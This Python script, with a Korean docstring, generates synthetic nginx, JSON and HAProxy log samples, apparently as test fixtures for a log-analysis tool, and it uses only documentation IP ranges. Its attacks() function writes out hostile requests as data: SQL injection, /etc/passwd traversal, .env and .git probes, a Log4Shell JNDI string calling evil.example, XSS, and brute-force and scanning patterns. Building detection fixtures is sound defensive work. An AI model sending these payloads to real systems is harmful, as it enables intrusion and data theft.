"""테스트/시연용 가상 nginx 로그 생성: python tools/make_samples.py

samples/nginx_access.log   : 직접 접속(여러 IP)에 공격이 섞인 로그
samples/nginx_clean.log    : 이상 없는 로그
samples/nginx_behind_lb.log: LB 뒤라 모든 요청이 한 IP로 찍힌 로그(X-Forwarded-For 없음)
samples/nginx_xff.log      : LB 뒤지만 X-Forwarded-For가 기록된 로그
samples/nginx_json.log     : JSON 형식 로그
samples/nginx_bracket_lb.log: 대괄호형 log_format, 공인 IP의 LB 뒤(XFF 있음) + 직접 접속 스캐너 혼합
samples/nginx_error.log    : nginx error.log (노이즈, 프로토콜 스캔, 권한 오류, 업스트림 오류, 요청 제한)
samples/haproxy.log        : HAProxy httplog(syslog 접두) + 서버 다운/복구·TLS 핸드셰이크 실패 상태 줄
모두 가상 데이터이며 IP는 문서용 대역(192.0.2.x, 198.51.100.x, 203.0.113.x)이다.
"""
import json
import os
import random

OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "samples")
UA_WEB = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36",
          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"]
PAGES = ["/", "/index.html", "/about", "/products?id=%d", "/news/view?id=%d", "/api/list?page=%d", "/static/app.js", "/static/style.css"]


def fmt(ip, sec, req, status, size, ua, xff=None, user="-"):
    h, m, s = 9 + sec // 3600, (sec // 60) % 60, sec % 60
    t = "08/Oct/2026:%02d:%02d:%02d +0900" % (h, m, s)
    line = '%s - %s [%s] "%s" %d %d "-" "%s"' % (ip, user, t, req, status, size, ua)
    return line + (' "%s"' % xff if xff is not None else "")


def normal(rng, n, ips, lb=None, xff=False):
    rows = []
    for _ in range(n):
        ip = rng.choice(ips)
        sec = rng.randint(0, 8 * 3600)
        page = rng.choice(PAGES)
        req = "GET " + (page % rng.randint(1, 500) if "%d" in page else page) + " HTTP/1.1"
        rows.append((sec, ip, req, 200, rng.randint(300, 9000), rng.choice(UA_WEB)))
    return rows


def attacks():
    a = []
    # 203.0.113.9: SQLi + 스캐너 (일부 200 응답)
    for i, p in enumerate(["/news/view?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users--",
                           "/products?id=1%20AND%20SLEEP(5)--", "/news/view?id=1'%20OR%20'1'='1"]):
        a.append((3600 + i * 3, "203.0.113.9", "GET " + p + " HTTP/1.1", 200 if i == 0 else 500, 4200, "sqlmap/1.7"))
    # 198.51.100.20: 경로 탐색 + 취약경로
    for i, p in enumerate(["/../../etc/passwd", "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/"]):
        a.append((7200 + i * 2, "198.51.100.20", "GET " + p + " HTTP/1.1", 404, 153, "Mozilla/5.0 (compatible; scan)"))
    # 192.0.2.77: Log4Shell + XSS
    a.append((9000, "192.0.2.77", "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1", 400, 150, "curl/8.0"))
    a.append((9002, "192.0.2.77", "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", 200, 800, "Mozilla/5.0"))
    # 192.0.2.88: 비정상 Method + TLS 바이너리
    a.append((12000, "192.0.2.88", "PUT /upload/x.jsp HTTP/1.1", 405, 150, "Mozilla/5.0"))
    a.append((12010, "192.0.2.88", "\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03", 400, 150, "-"))
    # 198.51.100.50: 로그인 무차별 대입
    for i in range(30):
        a.append((15000 + i * 5, "198.51.100.50", "POST /account/login HTTP/1.1", 401, 120, "Mozilla/5.0"))
    # 198.51.100.60: 없는 경로 탐색
    for i in range(25):
        a.append((20000 + i, "198.51.100.60", "GET /admin%d.php HTTP/1.1" % i, 404, 153, "Mozilla/5.0"))
    return a


def write(name, rows, xff=False, ua_none=False):
    rows.sort(key=lambda r: r[0])
    with open(os.path.join(OUT, name), "w", encoding="utf-8", newline="\n") as f:
        for sec, ip, req, st, size, ua in rows:
            f.write(fmt(ip, sec, req, st, size, ua, xff=(ip if xff is True else None)) + "\n")


LB_IP = "203.0.113.250"          # 공인 IP의 LB
DIRECT = {"198.51.100.20", "192.0.2.88"}   # LB를 거치지 않고 직접 접속하는 스캐너


def bracket(ip, sec, req, st, size, ua, xff):
    h, m, s_ = 9 + sec // 3600, (sec // 60) % 60, sec % 60
    return '%s - - [08/Oct/2026:%02d:%02d:%02d +0900] [request "%s"] [status %d] [body_bytes_sent %d] "-" "%s" "%s"' % (
        ip, h, m, s_, req, st, size, ua, xff)


def hap(ip, sec, req, st, size, ua=None):
    h, m, s_ = 9 + sec // 3600, (sec // 60) % 60, sec % 60
    hdr = " {example.com|%s}" % ua if ua else ""
    return ('Oct  8 %02d:%02d:%02d localhost haproxy[589155]: %s:%d [08/Oct/2026:%02d:%02d:%02d.123] main~ http_back/nginx1 '
            '0/0/0/3/3 %d %d - - ---- 1/1/0/0/0 0/0%s "%s"') % (h, m, s_, ip, 40000 + sec % 20000, h, m, s_, st, size, hdr, req)


def write_extra(rng, users):
    rows = normal(rng, 800, users) + attacks()
    rows.sort(key=lambda r: r[0])
    with open(os.path.join(OUT, "nginx_bracket_lb.log"), "w", encoding="utf-8", newline="\n") as f:
        for sec, ip, req, st, sz, ua in rows:
            if ip in DIRECT:
                f.write(bracket(ip, sec, req, st, sz, ua, "-") + "\n")
            else:
                f.write(bracket(LB_IP, sec, req, st, sz, ua, ip) + "\n")
    # error.log
    def er(sec, lvl, msg):
        return "2026/10/08 %02d:%02d:%02d [%s] 1234#1234: %s" % (9 + sec // 3600, (sec // 60) % 60, sec % 60, lvl, msg)
    lines = [er(i * 7, "info", "*%d client closed connection while waiting for request, client: %s, server: 0.0.0.0:443" % (i, LB_IP))
             for i in range(60)]
    for i, p in enumerate(["JDWP-Handshake", "MGLNDD_192.0.2.1_80", "\\x16\\x03\\x01\\x00"]):
        lines.append(er(500 + i, "info", '*9%d client sent invalid method while reading client request line, client: 198.51.100.77, server: _, request: "%s"' % (i, p)))
    lines += [er(3600, "emerg", 'open() "/var/log/nginx/error.log" failed (13: Permission denied)')] * 2
    lines.append(er(4000, "error", '*55 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 203.0.113.9, server: example.com, request: "GET /api HTTP/1.1", upstream: "http://127.0.0.1:8080/api", host: "example.com"'))
    lines.append(er(4100, "error", '*56 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 198.51.100.20, server: _, request: "GET /.env HTTP/1.1", host: "example.com"'))
    lines.append(er(4200, "error", '*57 limiting requests, excess: 5.100 by zone "one", client: 192.0.2.99, server: example.com, request: "GET /search HTTP/1.1", host: "example.com"'))
    lines.sort()
    with open(os.path.join(OUT, "nginx_error.log"), "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(lines) + "\n")
    # haproxy: 접속자 IP가 바로 찍힘
    hl = [(sec, hap(ip, sec, req, st, sz, ua)) for sec, ip, req, st, sz, ua in rows]
    hl.append((20000, "Oct  8 14:33:20 localhost haproxy[589155]: 198.51.100.31:45512 [08/Oct/2026:14:33:20.135] main/1: SSL handshake failure"))
    hl.append((21000, 'Oct  8 14:50:00 localhost haproxy[589155]: Server http_back/nginx1 is DOWN, reason: Layer4 connection problem, info: "Connection refused", check duration: 0ms. 0 active and 0 backup servers left. 0 sessions active, 0 requeued, 0 remaining in queue.'))
    hl.append((21001, "Oct  8 14:50:00 localhost haproxy[589155]: backend http_back has no server available!"))
    hl.append((21060, "Oct  8 14:51:00 localhost haproxy[589155]: Server http_back/nginx1 is UP, reason: Layer6 check passed, check duration: 3ms. 1 active and 0 backup servers online. 0 sessions requeued, 0 total in queue."))
    hl.append((22000, hap("198.51.100.32", 22000, "<BADREQ>", 400, 0).replace("main~ http_back/nginx1", "main~ main/<NOSRV>")))
    hl.sort()
    with open(os.path.join(OUT, "haproxy.log"), "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(x for _s, x in hl) + "\n")


def main():
    os.makedirs(OUT, exist_ok=True)
    rng = random.Random(7)
    users = ["175.223.%d.%d" % (rng.randint(1, 250), rng.randint(1, 250)) for _ in range(40)]
    write("nginx_clean.log", normal(rng, 600, users))
    write("nginx_access.log", normal(rng, 800, users) + attacks())
    # LB 뒤, XFF 없음: 모든 요청이 10.0.0.5
    rows = [(s, "10.0.0.5", r, st, sz, ua) for s, _ip, r, st, sz, ua in normal(rng, 800, users) + attacks()]
    write("nginx_behind_lb.log", rows)
    # LB 뒤, XFF 기록: 접속 IP는 10.0.0.5, 마지막 필드가 실제 IP
    rows = normal(rng, 800, users) + attacks()
    rows.sort(key=lambda r: r[0])
    with open(os.path.join(OUT, "nginx_xff.log"), "w", encoding="utf-8", newline="\n") as f:
        for sec, ip, req, st, sz, ua in rows:
            f.write(fmt("10.0.0.5", sec, req, st, sz, ua, xff=ip) + "\n")
    write_extra(random.Random(11), users)
    # JSON
    with open(os.path.join(OUT, "nginx_json.log"), "w", encoding="utf-8", newline="\n") as f:
        for sec, ip, req, st, sz, ua in rows:
            f.write(json.dumps({"time_iso8601": "2026-10-08T%02d:%02d:%02d+09:00" % (9 + sec // 3600, (sec // 60) % 60, sec % 60),
                                "remote_addr": ip, "request": req, "status": st, "body_bytes_sent": sz,
                                "http_user_agent": ua, "http_x_forwarded_for": ""}) + "\n")


if __name__ == "__main__":
    main()
